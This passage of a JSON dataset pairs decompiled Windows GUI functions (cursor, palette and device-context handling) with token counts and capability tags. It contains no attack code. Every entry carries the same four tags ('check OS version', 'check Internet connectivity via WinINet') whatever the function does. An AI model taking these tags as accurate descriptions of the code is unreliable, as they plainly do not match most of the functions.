        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0044ea0c(void)\n\n{\n    uint *puVar1;\n    char in_AL;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0044ea0c::var_1h + 1;\n    puStack44 = &fcn.0044ea0c::var_1h + 1;\n    piVar5 = NULL;\n    if ((*0x497c84 == NULL) || (*(*0x497c84 + 5) != '\\0')) {\n        return;\n    }\n    uStack36 = 0x44ed21;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    *0x497cb0 = *0x497c84;\n    uStack48 = 0x44ecaf;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    *(*0x497c84 + 5) = 1;\n    *(*0x497c84 + 8) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.0044d88c();\n    if (*0x497ca0 == '\\x02') {\n        piVar5 = fcn.00404800();\n        (**(*piVar5 + 0x34))();\n        *(piVar5 + 0x1d) = piVar5[2] == 0;\n    }\n    if ((*0x497c84)[2] == 0) {\ncode_r0x0044eae4:\n        var_dh = (*0x497c84)[5];\n    }\n    else {\n        cVar2 = fcn.004047dc();\n        if (cVar2 == '\\0') goto code_r0x0044eae4;\n        var_dh = (*0x497c84)[7];\n    }\n    uStack60 = 0x44eafb;\n    cVar2 = fcn.0044e998(&fcn.0044ea0c::var_1h + 1);\n    if (cVar2 != '\\0') {\n        if ((*0x497ca0 == '\\x02') && (*(piVar5 + 0x1d) != '\\0')) {\ncode_r0x0044eb23:\n            if (var_1h != '\\0') {\n                uVar3 = 1;\n                goto code_r0x0044eb2f;\n            }\n        }\n        else if (*0x497ca0 != '\\0') {\n            cVar2 = fcn.0044e2a0();\n            if (cVar2 != '\\0') goto code_r0x0044eb23;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0044eb2f:\n    if (*0x497ca0 == '\\x02') {\n        if ((uVar3 != 0) && (*(piVar5 + 0x1d) != '\\0')) {\n            iVar4 = fcn.0043bd00();\n            if ((iVar4 != 0) && (*(iVar4 + 0x268) == piVar5[0x10])) {\n                fcn.00440a40();\n            }\n            uStack60 = 0x44eb7e;\n            fcn.00451abc(*0x497c84);\n        }\n    }\n    else if (*0x497ca4 == 0) {\n        uStack60 = 0x44eba0;\n        sub.user32.dll_SetCursor();\n    }\n    else {\n        fcn.0045a260();\n    }\n    *0x497c80 = 0;\n    *0x497c84 = NULL;\n    if ((*0x497cb0 != NULL) && ((*0x497cb0)[2] != 0)) {\n        if (uVar3 == 0) {\n            (*0x497cb0)[4] = 0;\n            (*0x497cb0)[5] = 0;\n        }\n        puVar1 = *0x497cb0;\n        uStack60 = 0x44ec53;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        arg_8h = *0x497cb0 + 4;\n        fcn.0044e16c(arg_8h, (*0x497cb0)[2]);\n        *in_FS_OFFSET = arg_8h;\n        if (*0x497cb0 == NULL) {\n            *0x497cb0 = puVar1;\n        }\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x44ecb6;\n    uStack48 = 0x44ec71;\n    fcn.00404650();\n    *0x497cac = 0;\n    if (*0x497cb0 != NULL) {\n        *(*0x497cb0 + 5) = 0;\n        uStack48 = var_dh;\n        uStack52 = uVar3;\n        (****0x497cb0)();\n    }\n    *0x497c84 = NULL;\n    return;\n}\n",
        "token_count": 1267
    },
    "0044ed30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044ed30(void)\n\n{\n    if (*0x497c84 != 0) {\n        fcn.0044ea0c();\n    }\n    *0x497c80 = 0;\n    return;\n}\n",
        "token_count": 52
    },
    "0044edc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044edc8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.00404620();\n        *in_EAX = iVar1;\n    }\n    fcn.00419730();\n    return;\n}\n",
        "token_count": 75
    },
    "0044edf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044edf0(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004199cc();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00404650();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0044eefc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044eefc(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x44ef0c;\n    var_8h = fcn.00419bf8();\n    uStack24 = 0x44ef9a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x44ef37;\n            var_ch = fcn.00419888();\n            puStack32 = 0x44ef42;\n            cVar1 = fcn.0042552c();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x44ef72;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.0044f07c();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x44ef79;\n                uStack36 = 0x44ef71;\n                fcn.00425588();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44efa1;\n    uStack24 = 0x44ef99;\n    fcn.00419c5c();\n    return;\n}\n",
        "token_count": 454
    },
    "0044efd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044efd4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) == 0) {\n        puStack16 = 0x44efed;\n        fcn.00425718();\n    }\n    else {\n        if (*(in_EAX + 0x5c) == 0) {\n            puStack16 = 0x44f005;\n            iVar1 = fcn.00419bf8();\n            uStack20 = 0x44f059;\n            uStack24 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            puStack16 = &stack0xfffffffc;\n            if (3 < *(iVar1 + 8)) {\n                puStack16 = &stack0xfffffffc;\n                fcn.0044ee40();\n            }\n            uVar2 = (**(**(in_EAX + 0x58) + 0x48))();\n            *(in_EAX + 0x5c) = uVar2;\n            fcn.00419730();\n            *in_FS_OFFSET = uStack24;\n            puStack16 = 0x44f060;\n            uStack20 = 0x44f058;\n            fcn.00419c5c();\n            return;\n        }\n        puStack16 = 0x44f06e;\n        fcn.0042571c();\n        puStack16 = 0x44f076;\n        fcn.0044f0c8();\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "0044f07c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044f07c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) != 0) {\n        fcn.0042571c();\n        fcn.00419c0c();\n        sub.user32.dll_ReleaseDC(*(in_EAX + 0x60), *(in_EAX + 0x5c));\n        *(in_EAX + 0x5c) = 0;\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "0044f234": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0044f234(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack48 = &fcn.0044f234::var_1h + 1;\n    var_8h = 0;\n    uStack52 = 0x44f301;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_1h._0_1_ = 1;\n    arg_8h = 0x44f269;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        arg_8h = 0x44f27b;\n        cVar1 = fcn.0040484c();\n        if ((((cVar1 != '\\0') && (*(**0x4925c4 + 0x7c) != '\\0')) && (*(*(in_EAX + 0x10) + 0x84) != 0)) &&\n           (*param_2 != 0)) {\n            arg_8h = &fcn.0044f234::var_8h;\n            fcn.00433ab0();\n            fcn.0040af88(arg_8h);\n            fcn.00405584();\n        }\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x44f308;\n    iStack56 = 0x44f2f8;\n    fcn.00405530();\n    iStack56 = 0x44f300;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 478
    },
    "0044f66c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0044f66c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff44();\n    in_EAX[0xf] = in_EAX;\n    in_EAX[0xe] = *(*in_EAX + 0x78);\n    in_EAX[0x14] = *0x44f75c;\n    iVar1 = fcn.004244a8();\n    in_EAX[0x1a] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x4508b4;\n    *(in_EAX + 0x61) = *0x44f760;\n    iVar1 = fcn.0044f0f4();\n    in_EAX[0x1d] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x451878;\n    iVar1 = fcn.0045dc1c();\n    in_EAX[0x1e] = iVar1;\n    *(iVar1 + 0x1c) = in_EAX;\n    *(iVar1 + 0x18) = 0x453350;\n    in_EAX[0x1c] = -0xfffffb;\n    *(in_EAX + 0x57) = 1;\n    *(in_EAX + 0x16) = 1;\n    *(in_EAX + 0x59) = 1;\n    *(in_EAX + 0x5a) = 1;\n    *(in_EAX + 0x8e) = 1;\n    *(in_EAX + 0x18) = 1;\n    *(in_EAX + 0x5e) = 0;\n    *(in_EAX + 0x7e) = 0xfff4;\n    in_EAX[0x2b] = *0x43b144;\n    *(in_EAX + 0x56) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 588
    },
    "0044f870": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044f870(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_stack_ffffffe8;\n    uint uStack20;\n    \n    uVar2 = 0;\n    if (*(in_EAX + 0x57) != '\\0') {\n        iVar1 = fcn.0040484c(in_stack_ffffffe8 & 0xffffff00 | param_2);\n        if (iVar1 != 0) {\n            uStack20 = (**(*in_EAX + 0x48))();\n            uVar2 = sub.gdi32.dll_SelectPalette();\n            iVar1 = sub.gdi32.dll_RealizePalette(uStack20);\n            if (iVar1 != 0) {\n                (**(*in_EAX + 0x80))();\n            }\n            sub.gdi32.dll_SelectPalette(uStack20, uVar2, 0xffffffff);\n            sub.user32.dll_ReleaseDC(uVar2);\n            uVar2 = 1;\n        }\n    }\n    return CONCAT44(uStack20, uVar2);\n}\n",
        "token_count": 253
    },
    "0044fa9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044fa9c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 8;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x6c))();\n    }\n    fcn.004203bc();\n    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfff7;\n    if (in_EAX[0xc] != 0) {\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n        fcn.00451abc(0);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "0044ff64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ff64(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x94)) {\n        if ((*(in_EAX + 0x94) != 0) && (*(*(in_EAX + 0x94) + 0x1ac) != 0)) {\n            puStack40 = 0x44ffa9;\n            fcn.004199cc();\n            puStack40 = 0x44ffba;\n            fcn.00420258();\n        }\n        if (((param_2 != 0) && (param_2 != -1)) && (*(param_2 + 0x1ac) != 0)) {\n            puStack40 = 0x44ffda;\n            fcn.00419730();\n        }\n    }\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) | 0x400;\n    uStack44 = 0x450084;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    if (param_2 != -1) {\n        puStack40 = &stack0xfffffffc;\n        fcn.0040484c();\n    }\n    iVar1 = *(in_EAX + 0x94);\n    if (param_2 != iVar1) {\n        if (param_2 == -1) {\n            *(in_EAX + 0x94) = 0;\n        }\n        else {\n            *(in_EAX + 0x94) = param_2;\n            if (param_2 != 0) {\n                fcn.0040484c();\n                fcn.00420018();\n            }\n        }\n        if (iVar1 != 0) {\n            fcn.0040484c();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x54) = *(in_EAX + 0x54) & 0xfbff;\n    return;\n}\n",
        "token_count": 523
    },
    "00450204": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450204(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450285;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407550();\n        fcn.0040db28(in_stack_ffffffd4, arg_ch);\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    (**(**(in_EAX + 0x30) + 0x40))();\n    *param_2 = *param_2 + *(in_EAX + 0x40);\n    param_2[1] = param_2[1] + *(in_EAX + 0x44);\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x45028c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 389
    },
    "004503a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004503a0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x94) != 0) && (*0x497c84 == 0)) && (*0x450408 == (*0x450404 & *(in_EAX + 0x1c)))) {\n        var_8h = arg_8h;\n        fcn.00451abc(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00450930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450930(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x59)) && (*(in_EAX + 0x59) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451abc(0);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "004509cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004509cc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x5a)) && (*(in_EAX + 0x5a) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451abc(0);\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "004509f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004509f0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((param_2 != *(in_EAX + 0x60)) && (*(in_EAX + 0x60) = param_2,  *(in_EAX + 0x30) != 0)) &&\n       ((*(in_EAX + 0x1c) & 2) == 0)) {\n        fcn.00451abc(0);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00450b28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00450b28(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x450bbe;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(in_EAX + 0x30) == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        uVar2 = 0;\n        fcn.00407550();\n        fcn.0040db28(uVar2, arg_ch);\n        fcn.00404ec4();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    uVar2 = (**(**(in_EAX + 0x30) + 0x48))();\n    sub.gdi32.dll_SetViewportOrgEx(uVar2, *(in_EAX + 0x40), *(in_EAX + 0x44), 0);\n    sub.gdi32.dll_IntersectClipRect(uVar2, 0, 0, *(in_EAX + 0x48), *(in_EAX + 0x4c));\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x450bc5);\n    return;\n}\n",
        "token_count": 395
    },
    "00450bd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00450bd0(int32_t lprcSrc1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lprcSrc2;\n    uint lprcDst;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    iVar1 = fcn.004198e4();\n    do {\n        do {\n            if (iVar1 < 1) {\n                return 0;\n            }\n            iVar1 = iVar1 + -1;\n            iVar2 = fcn.00419888();\n        } while ((*(iVar2 + 0x57) == '\\0') || ((*(iVar2 + 0x50) & 0x40) == 0));\n        fcn.00450124();\n        sub.user32.dll_IntersectRect(&lprcDst, lprcSrc1 + -0x14, &lprcSrc2);\n        iVar2 = sub.user32.dll_EqualRect(&lprcDst, lprcSrc1 + -0x14);\n    } while (iVar2 == 0);\n    return var_1h;\n}\n",
        "token_count": 278
    },
    "00450c5c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00450c5c(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    uint var_15h;\n    int32_t var_4h;\n    \n    if (param_2 == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            return;\n        }\n        if ((*(in_EAX + 0x51) & 4) != 0) {\n            return;\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        return;\n    }\n    var_4h = in_EAX;\n    cVar2 = fcn.00458874();\n    if (cVar2 != '\\0') {\n        fcn.00450124();\n        if (((var_15h == '\\0') && ((*(*(var_4h + 0x30) + 0x50) & 0x40) == 0)) &&\n           (cVar2 = fcn.00450bd0(&stack0xfffffffc),  cVar2 == '\\0')) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        uVar3 = fcn.00458568(&var_15h + 1, -uVar1);\n        sub.user32.dll_InvalidateRect(uVar3);\n        return;\n    }\n    return;\n}\n",
        "token_count": 349
    },
    "00450cfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00450cfc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    unkbyte3 in_ECX;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = CONCAT13(in_ECX, in_ECX) & 0xff00ffff;\n    if (*(in_EAX + 0x12a) != 0) {\n        (**(in_EAX + 0x128))(auStack8 + 2, arg_8h, arg_ch, arg_10h, in_ECX);\n    }\n    return auStack8[2];\n}\n",
        "token_count": 174
    },
    "00450d44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450d44(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t arg_8h;\n    \n    piVar1 = fcn.0043bd00();\n    piVar2 = fcn.0044d5b0();\n    if ((((piVar2 != NULL) && (piVar1 != piVar2)) && (in_EAX != piVar2)) && (piVar2[0xc] == 0)) {\n        (**(*piVar2 + 0x78))();\n    }\n    if (*(param_2 + 0xc) == 0) {\n        if ((piVar1 == NULL) || (in_EAX == piVar1)) {\n            arg_8h = *(param_2 + 8);\n            uVar3 = fcn.00451abc(arg_8h);\n            *(arg_8h + 0xc) = uVar3;\n        }\n        else {\n            fcn.0040484c();\n        }\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00450dd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00450dd8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x57) != '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x51) & 4) == 0)))) &&\n       (in_EAX[0xc] != 0)) {\n        uStack20 = 0x450e1d;\n        cVar1 = fcn.00458874();\n        if (cVar1 != '\\0') {\n            if ((*(in_EAX + 0x14) & 0x40) != 0) {\n                uStack20 = 0x450e3d;\n                uStack20 = fcn.00458568();\n                puStack24 = 0x450e43;\n                uVar2 = sub.user32.dll_GetDC();\n                uStack28 = 0x450eb1;\n                uStack32 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffe0;\n                uVar3 = uVar2;\n                puStack24 = &stack0xfffffffc;\n                sub.gdi32.dll_IntersectClipRect\n                          (uVar2, in_EAX[0x10], in_EAX[0x11], in_EAX[0x10] + in_EAX[0x12], in_EAX[0x11] + in_EAX[0x13]);\n                fcn.00455e58();\n                *in_FS_OFFSET = uVar3;\n                uVar3 = fcn.00458568(uVar2, 0x450ece);\n                sub.user32.dll_ReleaseDC(uVar3);\n                return;\n            }\n            uStack20 = 0x450ec3;\n            (**(*in_EAX + 0x80))();\n            uStack20 = 0x450ece;\n            (**(*in_EAX + 0x8c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 502
    },
    "00450ed8": {
